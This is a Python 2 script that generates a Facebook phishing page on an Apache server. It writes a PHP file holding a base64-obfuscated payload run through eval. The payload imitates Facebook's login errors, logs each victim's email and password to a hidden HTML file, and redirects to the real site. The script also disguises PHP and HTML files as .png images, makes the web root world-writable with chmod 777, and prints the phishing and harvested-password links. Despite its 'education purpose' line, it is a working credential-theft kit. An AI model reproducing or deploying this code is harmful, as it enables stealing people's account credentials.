import os
import random
import shutil
from data import colors
from subprocess import check_output


submitcode = random.randint(00000,99999)
print "Submit-Code"+colors.color.red
print submitcode
id = raw_input(colors.color.end+"Enter Submit-Code : ")
folder = os.mkdir("/var/www/html/"+id)
password = raw_input("Enter password : ")
file=open("/var/www/html/"+id+"/index.php","a")
file.write("<?php"+"\n")
file.write("$passname = '"+password+".html';")
file.write('$qdf7061a="\x62\x61\163\145\66\64\137\144\x65\143\x6f\x64\145";@eval($qdf7061a("Pz4gICA8P3BocCAgIGluY2x1ZGUgImhlYWRlcjIuaHRtbCI7ICRsaW5rID0gImh0dHA6Ly93d3cuZmFjZWJvb2suY29tIjsgIGlmKGlzc2V0KCRfUE9TVFsnbG9naW4nXSkpeyAgIGZ1bmN0aW9uIHBhc3MoJHBhc3NuYW1lLCRsaW5rKXsgICAkZmFpbCA9ICIgIjsgJHVzZXI9ICRfUE9TVFsnZW1haWwnXTsgJHBhc3M9ICRfUE9TVFsncGFzcyddOyAkeCA9IHN0cmxlbigkcGFzcyk7IGlmKCR4ID4gNyAmJiAkeCA8IDIwKXsgCSAkZiA9IGZvcGVuKCRwYXNzbmFtZSAsICJhIik7IGZ3cml0ZSAoJGYgLCAiPGZvbnQgc2l6ZSA9ICcxJz5FbWFpbD5bIi4gJHVzZXIgLiAiXTpQYXNzd29yZD5bIi4gJHBhc3MgLiIgXTwvZm9udD48aHI+Iik7IGZjbG9zZSgkZik7ICBoZWFkZXIoIkxvY2F0aW9uOiRsaW5rIik7IH0gCWVsc2V7IGVjaG8gJzxmb250IGNvbG9yID0gIndoaXRlIiBzaXplID0gIjIiPiBUaGUgcGFzc3dvcmQgeW91IGVudGVyZWQgaXMgaW5jb3JyZWN0LiA8YSBocmVmID0gIiBodHRwczovL20uZmFjZWJvb2suY29tL3JlY292ZXIvaW5pdGlhdGUvPyAiPiA8L2ZvbnQ+PGZvbnQgY29sb3IgPSAid2hpdGUiPjxiPkRpZCB5b3UgZm9yZ2V0IHlvdXIgcGFzc3dvcmQ/PC9iPjwvYT4gPC9mb250Pic7ICAkZmlsID0gJyBzdHlsZSA9ICJib3JkZXI6MXB4IHNvbGlkIHJlZDsiICc7IH0gfSAkcGFzcyAgPSAgJF9QT1NUWydwYXNzJ107ICAkeCA9IHN0cmxlbigkcGFzcyk7ICAkaXAgPSAkX1NFUlZFUlsnUkVNT1RFX0FERFInXTsgJGdkYXRlID0gZ2V0ZGF0ZSgpOyAkeSA9ICRnZGF0ZVsneWVhciddOyAkbSA9ICRnZGF0ZVsnbW9uJ107ICRkID0gJGdkYXRlWydtZGF5J107ICR0aW1lID0gIiRkLSRtLSR5IjsgJGZhaWwgPSAiICI7ICRmaWwgPSAiICI7ICR1c2VyPSAkX1BPU1RbJ2VtYWlsJ107ICRnID0gc3RybGVuKCR1c2VyKTsgJHMgPSBzdHJjaHIoJHVzZXIsIjA5Iik7ICRoID0gc3RyY2hyKCR1c2VyLCJAIik7ICRpID0gc3RyY2hyKCRoLCIuIik7ICBlY2hvICcgPGRpdiBzdHlsZT0iYm9yZGVyOjFweCBzb2xpZCByZWQ7IGJhY2tncm91bmQ6cmVkOyI+PGZvbnQgY29sb3IgPSAid2hpdGUiPjxwIHN0eWxlPSJtYXJnaW4tbGVmdDoxMHB4OyBtYXJnaW4tdG9wOjNweDsgbWFyZ2luLWJvdHRvbTozcHg7Ij4nOyBpZigkZyA9PSAxMSl7IAlpZihlbXB0eSgkcykpeyAkZmFpbCA9ICcgc3R5bGU9ImJvcmRlcjogc29saWQgMXB4IHJlZDsgICBjb2xvcjogcmVkOyInIDsgIGVjaG8gJyA8Zm9udCBjb2xvciA9ICJ3aGl0ZSIgc2l6ZSA9ICIzIj4nOyBlY2hvICJUaGUgZW1haWwgYWRkcmVzcyBvciBwaG9uZSBudW1iZXIgdGhhdCB5b3UndmUgZW50ZXJlZCBkb2Vzbid0IG1hdGNoIGFueSBhY2NvdW50LiI7ICBlY2hvICc8YSBocmVmID0gIiBodHRwOi8vaC5mYWNlYm9vay5jb20vaHIvcj9yZWRpcmVjdF9hcHA9NSZuZXh0PWh0dHBzJTNBJTJGJTJGbS5mYWNlYm9vay5jb20lMkZyLnBocCZ6Yz1BZm9ybThETW51MUd3RzB6bUtjaDNQMDhHSXpYUGV0YXFHM1BCTzV2Y3VzeV9LWWp0NGM0Z3g0UUlQUXJfTEI2QU1RJnJ0aW1lPTE0NzU3NDAwMzQmcmVmc3JjPWh0dHBzJTNBJTJGJTJGbS5mYWNlYm9vay5jb20lMkZsb2dpbiUyRiZfcmRyICI+IDxmb250IGNvbG9yID0gIndoaXRlIj5TaWduIHVwIGZvciBhbiBhY2NvdW50LjwvYT4gPC9mb250Pic7ICB9IAllbHNleyAkZmlsID0gJyBzdHlsZT0iYm9yZGVyOiBzb2xpZCAxcHggcmVkOyAgIGNvbG9yOiByZWQ7IicgOyAgIAlwYXNzKCRwYXNzbmFtZSwkbGluayk7IAkgCQl9IAl9IAllbHNlaWYgKCRnID4gMTEgJiYgJGcgPCAyNSl7IAkgaWYoZW1wdHkoJGkpKXsgJGZhaWwgPSAnIHN0eWxlPSJib3JkZXI6IHNvbGlkIDFweCByZWQ7ICAgY29sb3I6IHJlZDsiJyA7ICBlY2hvICcgPGZvbnQgY29sb3IgPSAid2hpdGUiIHNpemUgPSAiMyI+JzsgZWNobyAiVGhlIGVtYWlsIGFkZHJlc3Mgb3IgcGhvbmUgbnVtYmVyIHRoYXQgeW91J3ZlIGVudGVyZWQgZG9lc24ndCBtYXRjaCBhbnkgYWNjb3VudC4iOyAgZWNobyAnPGEgaHJlZiA9ICIgaHR0cDovL2guZmFjZWJvb2suY29tL2hyL3I/cmVkaXJlY3RfYXBwPTUmbmV4dD1odHRwcyUzQSUyRiUyRm0uZmFjZWJvb2suY29tJTJGci5waHAmemM9QWZvcm04RE1udTFHd0cwem1LY2gzUDA4R0l6WFBldGFxRzNQQk81dmN1c3lfS1lqdDRjNGd4NFFJUFFyX0xCNkFNUSZydGltZT0xNDc1NzQwMDM0JnJlZnNyYz1odHRwcyUzQSUyRiUyRm0uZmFjZWJvb2suY29tJTJGbG9naW4lMkYmX3JkciAiPiA8Zm9udCBjb2xvciA9ICJ3aGl0ZSI+U2lnbiB1cCBmb3IgYW4gYWNjb3VudC48L2E+IDwvZm9udD4nOyAgIH0gCWVsc2V7ICRmaWwgPSAnIHN0eWxlPSJib3JkZXI6IHNvbGlkIDFweCByZWQ7ICAgY29sb3I6IHJlZDsiJyA7ICAJcGFzcygkcGFzc25hbWUsJGxpbmspOyAJCX0gfSAJZWxzZXsgJGZhaWwgPSAnIHN0eWxlPSJib3JkZXI6IHNvbGlkIDFweCByZWQ7ICAgY29sb3I6IHJlZDsiJyA7ICBlY2hvICcgPGZvbnQgY29sb3IgPSAid2hpdGUiIHNpemUgPSAiMyI+JzsgZWNobyAiVGhlIGVtYWlsIGFkZHJlc3Mgb3IgcGhvbmUgbnVtYmVyIHRoYXQgeW91J3ZlIGVudGVyZWQgZG9lc24ndCBtYXRjaCBhbnkgYWNjb3VudC4iOyAgZWNobyAnPGEgaHJlZiA9ICIgaHR0cDovL2guZmFjZWJvb2suY29tL2hyL3I/cmVkaXJlY3RfYXBwPTUmbmV4dD1odHRwcyUzQSUyRiUyRm0uZmFjZWJvb2suY29tJTJGci5waHAmemM9QWZvcm04RE1udTFHd0cwem1LY2gzUDA4R0l6WFBldGFxRzNQQk81dmN1c3lfS1lqdDRjNGd4NFFJUFFyX0xCNkFNUSZydGltZT0xNDc1NzQwMDM0JnJlZnNyYz1odHRwcyUzQSUyRiUyRm0uZmFjZWJvb2suY29tJTJGbG9naW4lMkYmX3JkciAiPiA8Zm9udCBjb2xvciA9ICJ3aGl0ZSI+U2lnbiB1cCBmb3IgYW4gYWNjb3VudC48L2E+IDwvZm9udD4nOyAgfSAgZWNobyAnIDwvZm9udD48L3A+ICA8L2Rpdj4nOyAgaW5jbHVkZSAicG8ucGhwIjsgIH0gIGVsc2UgeyAgaW5jbHVkZSAiZm9vdGVyLnBocCI7fSAgPz4="));')
file.write("?>")
file.close()

shutil.copy2("data/png/fh.png", "/var/www/html/"+id+"/header2.html")
shutil.copy2("data/png/fo.png", "/var/www/html/"+id+"/footer.php")
shutil.copy2("data/png/fp.png", "/var/www/html/"+id+"/po.php")
print "["+colors.color.green+"Generate phishing........"+colors.color.end+"]"
os.system("sleep 1")
print "["+colors.color.green+"We are Lazy men........"+colors.color.end+"]"
os.system("sleep 1")
print "["+colors.color.green+"This is only for education purpose........"+colors.color.end+"]"
os.system("sleep 1")
print "["+colors.color.green+"Please Wait.............."+colors.color.end+"]"
os.system("sleep 1")
print "["+colors.color.green+"Please Wait..............50%"+colors.color.end+"]"
os.system("sleep 1")
print "["+colors.color.green+"Please Wait..............99%"+colors.color.end+"]"
os.system("sleep 1")
os.system("chmod -R 777 /var/www/html/")

ips = check_output(['hostname', '--all-ip-addresses'])
indexfilelink = "Your phishing link is {{{ http://"+ips+"/"+id+"}}}"
passfilelink = "Your password link is {{{ http://"+ips+"/"+id+"/"+password+".html }}}"
print "\n"
print "Phishing is successfully created at /var/www/html/"
print indexfilelink
print passfilelink
confirm = raw_input("\nDo you wanted to start Apache2 service [yes or no] : ")
if confirm == "yes" or confirm == "y" or confirm == "Y" or confirm == "Yes" or confirm == "YES" :
	os.system("service apache2 start")
